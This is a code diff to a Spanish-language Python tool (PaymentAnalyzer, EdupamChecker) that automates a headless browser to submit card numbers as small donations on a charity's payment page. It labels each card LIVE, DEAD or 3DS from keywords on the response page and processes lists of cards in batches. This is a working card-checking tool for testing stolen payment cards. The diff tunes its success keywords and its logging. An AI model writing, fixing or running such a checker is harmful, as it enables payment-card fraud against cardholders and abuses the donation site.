@@ -64,15 +64,11 @@ class PaymentAnalyzer:
             logger.info(f"🔍 CONTENIDO (300 chars): {page_content[:300]}")
             
             # LIVE - busca ESTAS palabras EXACTAS
-            if 'pago' in page_content_lower:
+            if '¡muchas gracias' in page_content_lower or 'muchas gracias' in page_content_lower:
                 final_status = 'live'
-                evidence.append('LIVE: palabra "pago" encontrada')
-                logger.info(f"✅ ENCONTRADO 'pago' - ES LIVE")
-            elif 'éxito' in page_content_lower or 'exito' in page_content_lower:
-                final_status = 'live'
-                evidence.append('LIVE: palabra "éxito" encontrada')
-                logger.info(f"✅ ENCONTRADO 'éxito' - ES LIVE")
-            
+                evidence.append('LIVE: palabra "Muchas gracias" encontradas')
+                logger.info(f"ENCONTRADO 'muchas gracias' - Es live")
+
             # DEAD - busca ESTAS palabras
             elif 'rechazada' in page_content_lower:
                 final_status = 'decline'
@@ -86,6 +82,10 @@ class PaymentAnalyzer:
                 final_status = 'decline'
                 evidence.append('DEAD: palabra "venció" encontrada')
                 logger.info(f"❌ ENCONTRADO 'venció' - ES DEAD")
+            elif 'admite' in page_content_lower:
+                final_status = 'decline'
+                evidence.append('DEAD: palabra "admite" encontrada')
+                logger.info(f"❌ ENCONTRADO 'admite' - ES DEAD")
             
             # 3DS - busca ESTAS palabras
             elif '3d' in page_content_lower:
@@ -208,7 +208,8 @@ class EdupamChecker:
 
     def check_single_card(self, card_string, amount=50):
         """Verificar una sola tarjeta - CIERRA después de cada una"""
-        logger.info(f"Verificando tarjeta: ****{card_string.split('|')[0][-4:]}")
+        card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
+        logger.info(f"🚀 INICIANDO NUEVA VERIFICACIÓN para ****{card_last4}")
         
         # Parsear tarjeta
         card_info = self.parse_card_data(card_string)
@@ -217,7 +218,7 @@ class EdupamChecker:
                 'success': False,
                 'status': 'error',
                 'message': 'Error parseando tarjeta',
-                'card': card_string.split('|')[0][-4:] if '|' in card_string else '????'
+                'card': card_last4
             }
         
         playwright = None
@@ -225,106 +226,93 @@ class EdupamChecker:
         page = None
         
         try:
-            # Iniciar Playwright
+            logger.info(f"1. Iniciando Playwright FRESCO...")
             playwright = sync_playwright().start()
             
+            logger.info(f"2. Lanzando Chromium NUEVO...")
             browser = playwright.chromium.launch(
                 executable_path='/usr/bin/chromium',
                 headless=True,
-                args=[
-                    '--no-sandbox',
-                    '--disable-setuid-sandbox',
-                    '--disable-dev-shm-usage',
-                    '--disable-accelerated-2d-canvas',
-                    '--disable-gpu'
-                ]
+                args=['--no-sandbox', '--disable-setuid-sandbox']
             )
             
-            context = browser.new_context(
-                viewport={'width': 1920, 'height': 1080},
-                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            )
+            logger.info(f"3. Creando contexto NUEVO...")
+            context = browser.new_context()
             
+            logger.info(f"4. Creando página NUEVA...")
             page = context.new_page()
             
-            # Navegar a la página de donación
-            page.goto(f"{self.base_url}{self.endpoint}", timeout=60000)
+            # Navegar
+            logger.info(f"5. Navegando a {self.base_url}{self.endpoint}...")
+            page.goto(f"{self.base_url}{self.endpoint}", timeout=30000)
             time.sleep(3)
             
+            # Verificar URL
+            logger.info(f"6. URL actual: {page.url}")
+            
             # Llenar formulario
+            logger.info(f"7. Llenando formulario...")
             if not self.fill_form(page, amount):
                 return {
                     'success': False,
                     'status': 'ERROR',
                     'message': 'Error llenando formulario',
-                    'card': card_info['numero'][-4:]
+                    'card': card_last4
                 }
             
             # Ingresar tarjeta
+            logger.info(f"8. Ingresando tarjeta ****{card_last4}...")
             if not self.fill_card_simple(page, card_info):
                 return {
                     'success': False,
                     'status': 'ERROR',
                     'message': 'Error ingresando tarjeta',
-                    'card': card_info['numero'][-4:]
+                    'card': card_last4
                 }
             
             time.sleep(2)
             
-            # Enviar donación
+            # Enviar
+            logger.info(f"9. Enviando donación...")
             btn = page.locator('#btn-donation')
             if btn.count() == 0:
                 return {
                     'success': False,
                     'status': 'ERROR',
                     'message': 'Botón no encontrado',
-                    'card': card_info['numero'][-4:]
+                    'card': card_last4
                 }
             
-            if btn.get_attribute('disabled'):
-                btn.click(force=True)
-            else:
-                btn.click()
+            btn.click()
             
-            # Esperar respuesta
+            # Esperar
+            logger.info(f"10. Esperando respuesta (8 segundos)...")
             time.sleep(8)
-
-            # ✅ AGREGAR LOG DE LO QUE HAY EN LA PÁGINA
+            
+            # DEBUG EXTREMO
+            logger.info(f"11. URL DESPUÉS de enviar: {page.url}")
             page_text = page.content()
-            logger.info(f"📄 CONTENIDO DE LA PÁGINA (primeros 500 chars): {page_text[:500]}")
+            logger.info(f"12. HTML (200 chars): {page_text[:200]}")
             
-            # ✅ AGREGAR LOG DE LA URL
-            logger.info(f"🌐 URL ACTUAL: {page.url}")
-            
-            # Tomar screenshot ANTES de cerrar
+            # Tomar screenshot ÚNICO para esta tarjeta
             screenshot_b64 = None
             try:
                 screenshot_bytes = page.screenshot(full_page=True)
                 screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
-                logger.info(f"📸 Screenshot tomado")
-                logger.info(screenshot_b64)
-            except:
-                pass
+                logger.info(f"13. 📸 Screenshot ÚNICO tomado para ****{card_last4}")
+            except Exception as e:
+                logger.error(f"Error screenshot: {e}")
             
-            # Analizar resultado
+            # Analizar
             current_url = page.url
-            page_content = page.content()
-            
             analysis = self.analyzer.analyze_payment_result(
-                page, current_url, card_info['numero'][-4:]
+                page, current_url, card_last4
             )
             
-            # Determinar estado final
-            status_map = {
-                'live': 'LIVE',
-                'decline': 'DEAD',
-                'threeds': '3DS',
-                'unknown': 'ERROR'
-            }
-            
+            # Resultado
+            status_map = {'live': 'LIVE', 'decline': 'DEAD', 'threeds': '3DS', 'unknown': 'ERROR'}
             final_status = status_map.get(analysis['status'], 'ERROR')
             
-            # Mensaje según estado
             messages = {
                 'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
                 'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
@@ -336,32 +324,36 @@ class EdupamChecker:
                 'success': True,
                 'status': final_status,
                 'original_status': messages.get(final_status, 'Estado desconocido'),
-                'message': ', '.join(analysis['evidence']) if analysis['evidence'] else 'Sin evidencia específica',
+                'message': ', '.join(analysis['evidence']),
                 'response': {
                     'url': analysis['url'],
                     'evidence': analysis['evidence'],
                     'screenshot': screenshot_b64,
                     'timestamp': datetime.now().isoformat()
                 },
-                'card': f"****{card_info['numero'][-4:]}",
+                'card': f"****{card_last4}",
                 'gate': 'Edupam',
                 'amount': amount
             }
             
-            # CERRAR TODO antes de retornar
+            logger.info(f"14. ✅ Verificación COMPLETADA para ****{card_last4}: {final_status}")
+            
+            # CERRAR TODO
+            logger.info(f"15. Cerrando recursos...")
             try:
                 page.close()
                 context.close()
                 browser.close()
                 playwright.stop()
-            except:
-                pass
+                logger.info(f"16. ✅ Recursos CERRADOS para ****{card_last4}")
+            except Exception as e:
+                logger.error(f"Error cerrando: {e}")
             
             return result
             
         except Exception as e:
-            logger.error(f"Error verificando tarjeta: {e}")
-            # CERRAR TODO aunque haya error
+            logger.error(f"❌ ERROR en ****{card_last4}: {e}")
+            # CERRAR TODO
             try:
                 if page and not page.is_closed():
                     page.close()
@@ -375,27 +367,9 @@ class EdupamChecker:
             return {
                 'success': False,
                 'status': 'ERROR',
-                'message': f'Error: {str(e)}',
-                'card': card_info['numero'][-4:] if 'card_info' in locals() else '????'
+                'message': f'Error: {str(e)[:100]}',
+                'card': card_last4
             }
-        
-        finally:
-            # Doble garantía de cierre
-            try:
-                if page and not page.is_closed():
-                    page.close()
-            except:
-                pass
-            try:
-                if browser:
-                    browser.close()
-            except:
-                pass
-            try:
-                if playwright:
-                    playwright.stop()
-            except:
-                pass
 # ========== FUNCIONES DEL WORKER ==========
 
 def process_cards_worker(cards, amount, stop_on_live):
